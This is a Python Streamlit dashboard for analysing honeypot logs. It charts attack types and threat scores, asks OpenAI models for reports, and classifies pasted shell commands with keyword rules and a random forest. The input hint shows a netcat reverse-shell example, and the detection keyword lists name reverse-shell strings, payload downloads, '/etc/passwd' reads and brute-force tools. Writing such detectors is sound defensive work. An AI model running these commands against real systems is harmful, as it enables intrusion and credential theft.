# scripts/dashboard.py
import streamlit as st
import pandas as pd
import plotly.express as px
import joblib
import openai
import os
from pathlib import Path
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier

# ---- Streamlit Page Setup ----
st.set_page_config(page_title="AI-Powered Honeypot Analytics Dashboard", layout="wide")
st.title("AI-Powered Honeypot Analytics Dashboard")

# ---- Load Data ----
logs_path = "data/honeypot_realistic_1000.csv"
try:
    df = pd.read_csv(logs_path)
    # FIX: create payload_hash_present feature for ML
    df['payload_hash_present'] = df['payload_hash'].fillna(0).astype(int)
except Exception as e:
    st.error(f"Failed to load data from {logs_path}: {e}")
    st.stop()


st.write(f"Number of sessions loaded: {len(df)}")

st.subheader("Raw Honeypot Logs")
st.dataframe(df)

# ---- AI-Generated Report (GPT-5, on-demand) ----
st.subheader("AI-Generated Report")
if st.button("Generate AI Report (GPT-5)"):
    try:
        openai_key = None
        if "OPENAI_API_KEY" in st.secrets:
            openai_key = st.secrets["OPENAI_API_KEY"]
        elif os.getenv("OPENAI_API_KEY"):
            openai_key = os.getenv("OPENAI_API_KEY")

        if not openai_key:
            st.warning("No OpenAI API key found. Add OPENAI_API_KEY to Streamlit Secrets to enable GPT analysis.")
        else:
            openai.api_key = openai_key

            attack_counts = df['attack_type'].value_counts().to_dict() if 'attack_type' in df.columns else {}
            threat_stats = df['threat_score'].describe().to_dict() if 'threat_score' in df.columns else {}
            top_locations = []
            if {'geo_lat', 'geo_lon'}.issubset(df.columns):
                top_locations = df[['geo_lat', 'geo_lon']].dropna().head(5).to_dict(orient='records')
            elif 'country' in df.columns:
                top_locations = df['country'].value_counts().head(5).to_dict()
            high_threat_count = int(df[df['threat_score'] >= 0.7].shape[0]) if 'threat_score' in df.columns else 0

            local_summary = (
                f"rows={len(df)}; attack_counts={attack_counts}; "
                f"threat_mean={threat_stats.get('mean', 'NA'):.2f}, threat_max={threat_stats.get('max', 'NA')}; "
                f"top_locations={top_locations}; high_threat_sessions={high_threat_count}"
            )

            prompt = (
                "You are a concise cybersecurity analyst. Based on the short summary below, "
                "write ONE concise paragraph (3-5 sentences) summarizing overall trends, "
                "then produce FIVE short bullet points (one line each) listing the most important insights or actions.\n\n"
                f"Summary: {local_summary}\n\n"
                "Output format: 1-paragraph summary, then exactly 5 bullets prefixed with '-'"
            )

            response = openai.chat.completions.create(
                model="gpt-5-mini",
                messages=[{"role": "user", "content": prompt}]
            )

            ai_report = response.choices[0].message.content
            st.success("AI Report Generated:")
            st.markdown(ai_report)

    except Exception as e:
        st.error(f"GPT-5 failed to generate report: {e}")

# ---- Summary Charts ----
st.subheader("Attack Type Distribution")
if 'attack_type' in df.columns:
    attack_counts = df['attack_type'].value_counts()
    fig1 = px.bar(x=attack_counts.index, y=attack_counts.values, labels={'x': 'Attack Type', 'y': 'Count'}, title="Attack Type Distribution")
    st.plotly_chart(fig1, use_container_width=True)
else:
    st.warning("Column 'attack_type' not found; skipping attack type chart.")

st.subheader("Threat Scores Distribution")
if 'threat_score' in df.columns:
    fig2 = px.histogram(df, x='threat_score', nbins=20, title="Threat Score Histogram")
    st.plotly_chart(fig2, use_container_width=True)
else:
    st.warning("Column 'threat_score' not found; skipping threat score chart.")

st.subheader("Attacks by Location")
if {'geo_lat', 'geo_lon'}.issubset(df.columns):
    fig3 = px.scatter_geo(
        df.dropna(subset=['geo_lat','geo_lon']),
        lat='geo_lat', lon='geo_lon',
        color='attack_type' if 'attack_type' in df.columns else None,
        size='threat_score' if 'threat_score' in df.columns else None,
        hover_name='src_ip' if 'src_ip' in df.columns else None,
        title="Global Attack Map"
    )
    st.plotly_chart(fig3, use_container_width=True)
else:
    st.info("No geo_lat/geo_lon columns available — skipping geo map.")

# ---- Real-time Session Classification (Paste command) ----
st.subheader("Classify a New Session (Paste Command)")
st.markdown("Paste a single session command (e.g. `nc -e /bin/sh 10.10.10.5 4444` or `nmap -sS 192.168.1.0/24`)")

session_input = st.text_area("Paste session command here:")

if st.button("Classify Command"):
    st.info("Analyzing session...")
    session_txt = (session_input or "").strip()
    if not session_txt:
        st.warning("Please paste a session command to classify.")
    else:
        cmd = session_txt.lower()
        if any(k in cmd for k in ["nmap","masscan","-sS","-sV"," -p"]):
            hpred = "Port Scan"
        elif any(k in cmd for k in ["nc -e","/bin/sh","python -c","bash -i","reverse shell","bash -c 'bash -i'"]):
            hpred = "Reverse Shell"
        elif any(k in cmd for k in ["wget ","curl ","http://","https://","ftp","download"]):
            hpred = "Malware Fetch / Payload Exec"
        elif any(k in cmd for k in ["hydra","john","medusa","sshpass","brute force","bruteforce"]):
            hpred = "Brute Force"
        elif any(k in cmd for k in ["grep password","cat /etc/passwd","id; uname","ps aux","whoami"]):
            hpred = "Recon / Info Gathering"
        else:
            hpred = "Unknown / Other"
        st.info(f"Heuristic Prediction: {hpred}")

        try:
            openai_key = None
            if "OPENAI_API_KEY" in st.secrets:
                openai_key = st.secrets["OPENAI_API_KEY"]
            elif os.getenv("OPENAI_API_KEY"):
                openai_key = os.getenv("OPENAI_API_KEY")

            if openai_key:
                openai.api_key = openai_key
                prompt = (
                    "You are a cybersecurity analyst. Classify the following command into one label "
                    "(Brute Force, Port Scan, Reverse Shell, Malware Fetch, Recon, Other). "
                    f"Command: {session_txt}"
                )
                response = openai.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[{"role":"user","content":prompt}]
                )
                gpred = response.choices[0].message.content.strip()
                st.success(f"GPT Prediction: {gpred}")
            else:
                st.info("OpenAI key not found — skipped GPT classification.")
        except Exception as e:
            st.warning(f"OpenAI call failed: {e}")

# ---- ML Section (Random Forest) ----
st.subheader("Classify Uploaded or Sample Session Data (Random Forest)")

uploaded_file = st.file_uploader("Upload a CSV with session features", type="csv")
use_sample = st.checkbox("Use sample session data for testing")

df_test = None
if uploaded_file:
    df_test = pd.read_csv(uploaded_file)
elif use_sample:
    df_test = pd.DataFrame([{
        'failed_logins':1, 'commands_count':3, 'has_url':1,
        'payload_hash_present':0, 'geo_lat':40.24, 'geo_lon':116.65,
        'threat_score':0.4
    }])

if df_test is not None:
    model_path = Path("models/honeypot_model.pkl")
    features = ['failed_logins','commands_count','has_url','payload_hash_present','geo_lat','geo_lon','threat_score']

    # Train model if missing
    if not model_path.exists():
        st.info("Training Random Forest model for the first time...")
        if all(f in df.columns for f in features) and 'attack_type' in df.columns:
            X = df[features]
            y = df['attack_type'].apply(lambda x: 0 if x=='benign' else 1)
            clf = RandomForestClassifier(n_estimators=100, random_state=42)
            clf.fit(X, y)
            joblib.dump(clf, model_path)
        else:
            st.error("Cannot train model — main dataset missing required features or 'attack_type' column")
            clf = None
    else:
        clf = joblib.load(model_path)

    # Predict
    if clf is not None and all(f in df_test.columns for f in features):
        preds = clf.predict(df_test[features])
        df_test['ML_Prediction'] = preds
        st.dataframe(df_test)
    elif clf is not None:
        st.error("Test data is missing required features")
